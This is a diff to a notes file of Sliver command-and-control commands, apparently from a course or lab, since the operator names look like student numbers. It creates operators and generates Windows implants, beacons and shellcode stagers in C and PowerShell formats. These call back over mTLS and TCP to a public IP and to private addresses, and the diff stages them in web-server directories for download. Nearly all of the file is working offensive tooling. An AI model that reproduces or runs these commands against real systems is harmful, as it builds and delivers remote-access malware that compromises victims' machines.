@@ -8,10 +8,27 @@ new-operator --name 20120083 --lhost 18.143.102.216 --lport 31337 --save ../clie
 mv ./tools/client_config/20120083_client.cfg /home/kali/.sliver-client/configs
 
 // create implant sessions
-generate --mtls 192.168.216.14 --os windows --arch amd64 --format exe --save /var/www/html/sessions
-beacon --mtls 192.168.122.14:8080 --os windows --arch amd64 --format exe --save /var/www/html/beacons --seconds 5 --jitter 3
+generate --mtls 18.143.102.216:8080 --os windows --name session_00 --arch amd64 --format exe --save /var/www/apt_domain/sessions
+generate beacon --mtls 18.143.102.216:8080 --os windows --arch amd64 --format exe --save /var/www/apt_domain/beacons --seconds 5 --jitter 3
+
+
+generate --mtls 18.143.102.216:8080 --os windows --name session_00 --arch amd64 --format exe --save /var/www/html/sessions
+generate beacon --mtls 18.143.102.216:8080 --os windows --arch amd64 --format exe --save /var/www/html/beacons --seconds 5 --jitter 3
 
 new-operator --name huhu --lhost localhost --lport 31337 --save /home/kali/.sliver-client/configs
+
+// create implant sessions
+generate --mtls 192.168.216.14:8080 --os windows --arch amd64 --format exe --save /var/www/html
+generate beacon --mtls 192.168.216.14:8080 --os windows --arch amd64 --format exe --save /var/www/html --seconds 5 --jitter 3
+
+// stager
+profiles new --mtls 18.143.102.216:8080 --skip-symbols --format shellcode --arch amd64 win64
+stage-listener --url tcp://18.143.102.216:1234 --profile win64
+jobs
+generate stager --lhost 18.143.102.216 --lport 1234 --protocol tcp --arch amd64 --format c --save /var/www/html
+
+profiles new --mtls 18.143.102.216:8080 --format shellcode win-shellcode
+generate stager --lhost 10.0.149.9 --lport 1234 --protocol tcp --arch amd64 --format ps1 --save /tmp
 
 20120078
 20120083
@@ -24,3 +41,5 @@ kick-operator -n 20120083
 kick-operator -n 20120116
 kick-operator -n 20120176
 kick-operator -n 20120313
+
+sudo chmod -R +rX /var/www/apt_domain/beacons/
